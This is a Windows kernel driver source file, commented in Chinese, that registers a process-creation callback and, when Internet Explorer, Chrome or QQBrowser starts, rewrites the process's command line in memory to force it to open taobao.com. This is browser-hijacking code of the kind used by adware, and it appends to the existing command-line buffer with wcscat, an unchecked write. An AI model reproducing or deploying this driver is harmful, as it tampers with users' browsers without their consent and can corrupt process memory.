/*************************************************
Copyright (C), 2009-2012    , Level Chip Co., Ltd.
文件名:	main.c
作  者:	钱锐      版本: V0.0.1     新建日期: 2025.01.26
描  述: 驱动锁定浏览器主页
备  注: 
修改记录:

  1.  日期: 2025.01.26
	  作者: 钱锐
	  内容:
		  1) 此为模板第一个版本；
	  版本:V0.0.1

*************************************************/

#include <ntifs.h>
#include <ntddk.h>

#include "ExportAPI.h"

VOID Create_Process_Notify_Routine(_In_ HANDLE ParentId, _In_ HANDLE ProcessId,	_In_ BOOLEAN Create)
{
	if (!Create)
	{
		KdPrint(("非创建进程\n"));
		return;
	}

	//只处理进程创建的情况

	NTSTATUS lNTStatus = STATUS_SUCCESS;
	PEPROCESS ptPeProcess = NULL;
	KAPC_STATE tKApc_State = { 0 };
	PPEB ptPeb = NULL;

	lNTStatus = PsLookupProcessByProcessId(ProcessId, &ptPeProcess);
	if (!NT_SUCCESS(lNTStatus))
	{
		KdPrint(("PsLookupProcessByProcessId is err\n"));
		return;
	}

	if ((_strnicmp(PsGetProcessImageFileName(ptPeProcess), "iexplore.exe", strlen("iexplore.exe")) == 0) ||
		(_strnicmp(PsGetProcessImageFileName(ptPeProcess), "chrome.exe", strlen("chrome.exe")) == 0) ||
		(_strnicmp(PsGetProcessImageFileName(ptPeProcess), "QQBrowser.exe", strlen("QQBrowser.exe")) == 0))
	{
		ptPeb = PsGetProcessPeb(ptPeProcess);
		if (!ptPeb)
		{
			KdPrint(("PsGetProcessPeb is err\n"));
			return;
		}

		KeStackAttachProcess(ptPeProcess, &tKApc_State);

		if (ptPeb->ProcessParameters->CommandLine.Length - ptPeb->ProcessParameters->ImagePathName.Length == 70)//70为查看dbgview得出的qq浏览器启动时，命令行参数的长度信息
		{
			UNICODE_STRING tCommandLine;
			PWCHAR pwchCommandLineBuf = ptPeb->ProcessParameters->CommandLine.Buffer;

			wcscat(pwchCommandLineBuf, L" http://www.taobao.com");
			RtlInitUnicodeString(&tCommandLine, pwchCommandLineBuf);

			ptPeb->ProcessParameters->CommandLine = tCommandLine;

			KdPrint(("Lock home page is suc\n"));
		}
		else
		{
			KdPrint(("Lock home page is fail, len = %d, %ls\n", 
				ptPeb->ProcessParameters->CommandLine.Length - ptPeb->ProcessParameters->ImagePathName.Length,
				ptPeb->ProcessParameters->CommandLine.Buffer));
		}

		KeUnstackDetachProcess(&tKApc_State);
	}
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	PsSetCreateProcessNotifyRoutine(Create_Process_Notify_Routine, TRUE);
	KdPrint(("驱动卸载成功\n"));
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
	NTSTATUS lNTStatus = STATUS_SUCCESS;
	HANDLE hThread = NULL;

	DriverObject->DriverUnload = DriverUnload;

	PsSetCreateProcessNotifyRoutine(Create_Process_Notify_Routine, FALSE);

	KdPrint(("驱动加载成功\n"));

	return lNTStatus;
}



